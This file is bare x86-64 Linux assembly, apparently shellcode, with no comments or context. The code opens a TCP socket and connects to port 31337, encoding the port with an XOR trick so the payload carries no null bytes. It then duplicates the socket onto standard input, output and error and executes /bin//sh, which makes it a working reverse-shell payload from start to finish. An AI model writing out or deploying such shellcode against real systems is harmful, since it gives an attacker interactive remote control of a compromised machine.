
	.section .text
	.globl _start

_start:

	pushq	$0x29
	popq	%rax
	pushq	$2
	popq	%rdi
	pushq	$1
	popq	%rsi
	xorl	%edx,%edx
	syscall
	movl	%eax,%ebp
	xorl	%eax,%eax
	pushq	%rax
	movl	$0x697afffd,%eax
	xorw	$0xffff,%ax
	pushq	%rax
	pushq	$0x2a
	popq	%rax
	movl	%ebp,%edi
	movq	%rsp,%rsi
	pushq	$0x10
	popq	%rdx
	syscall
	pushq	$2
	popq	%rbx
.L1:
	pushq	$0x21
	popq	%rax
	movl	%ebp,%edi
	movl	%ebx,%esi
	syscall
	decl	%ebx
	jns	.L1
	xorl	%eax,%eax
	pushq	%rax
	movq	$0x68732f2f6e69622f,%rdx
	pushq	%rdx
	movq	%rsp,%rdi
	pushq	%rax
	movq	%rsp,%rdx
	pushq	%rdi
	movq	%rsp,%rsi
	pushq	$0x3b
	popq	%rax
	syscall
